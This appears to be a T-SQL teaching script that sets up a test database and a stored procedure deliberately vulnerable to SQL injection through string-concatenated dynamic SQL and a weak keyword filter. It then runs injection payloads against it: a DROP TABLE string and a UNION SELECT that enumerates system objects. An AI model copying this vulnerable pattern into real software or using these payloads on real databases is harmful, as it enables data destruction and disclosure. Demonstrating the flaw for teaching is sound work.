use master
drop database AttackDB
go
create database AttackDB
go
use AttackDB
create table t1 (id int not null identity primary key,
				navn		varchar(20))
go
insert into t1 values ('bo')
insert into t1 values ('ib')
go
create proc usp_t 
@navn varchar(30)
as
declare @sql	varchar(2000)
if @navn like '%create%' or	@navn like '%;%'
	raiserror ('fejlagtig s�gekriterie', 16, 1)
else
begin
	set @sql = 'select * from t1 where navn = ''' + @navn + ''''
	print @sql
	exec (@sql)
end
go
exec usp_t 'bo'
go
exec usp_t 'bo''; drop table t1 --'
go
select * from t
go
create table t2 (id int not null identity primary key,
				navn		varchar(20))
go
insert into t2 values ('Bodil')
insert into t2 values ('ane')
go
exec usp_t 'bo'' union select object_id, name  from sys.objects --'


